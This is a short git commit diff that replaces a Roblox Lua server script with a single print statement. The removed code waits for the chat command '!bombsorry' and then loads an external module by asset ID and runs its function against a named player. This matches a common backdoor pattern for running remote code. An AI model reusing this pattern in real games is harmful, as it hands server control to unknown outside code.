f645357b4d040d1ebaa57ca02cc9ad5c4ae0f519
bailey923 <151684237+bailey923@users.noreply.github.com>
2025-07-14 20:02:49 -0300

    Update script.lua

--- script.lua
+++ script.lua
@@ -1,10 +1,1 @@
-local Players = game:GetService("Players")
-
-Players.PlayerAdded:Connect(function(player)
-    player.Chatted:Connect(function(message)
-        if message:lower() == "!bombsorry" then
-            -- Run the required module function
-            require(4867426485):SD2("Nickeymagic")
-        end
-    end)
-end)
+print("Hello")
